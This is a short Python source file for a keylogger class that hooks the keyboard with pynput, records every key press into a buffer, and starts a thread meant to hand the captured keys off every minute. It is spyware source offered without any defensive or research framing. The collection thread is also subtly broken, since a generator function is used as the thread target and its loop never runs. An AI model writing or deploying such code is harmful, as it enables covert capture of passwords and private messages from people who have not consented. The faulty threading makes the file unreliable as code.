import time
from datetime import datetime
from pynput import keyboard
import threading


class KeyLoggerService:

    def __init__(self):
        self.keyboard_listener = None
        self.key_buffer = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def start_listener(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        self.keyboard_listener.start()

        self.sent_thread = threading.Thread(target=self.send_every_minute)
        self.sent_thread.start()
    

    def on_key_press(self, key):
        with self.lock:
            try:
                if isinstance(key, keyboard.KeyCode):
                    self.key_buffer.append(key.char)
                else:
                    self.key_buffer.append(key.name)
            except Exception as e:
                print('Error: ', e)

    def send_every_minute(self):
        while not self.stop_event.is_set():  
            time.sleep(60)
            with self.lock:
                buffer = self.key_buffer.copy()
                if buffer:
                    self.clean_buffer()
                    yield buffer

    def stop_listener(self):
        self.stop_event.set()
        self.keyboard_listener.stop()
        self.sent_thread.join()


    def clean_buffer(self):
        self.key_buffer = []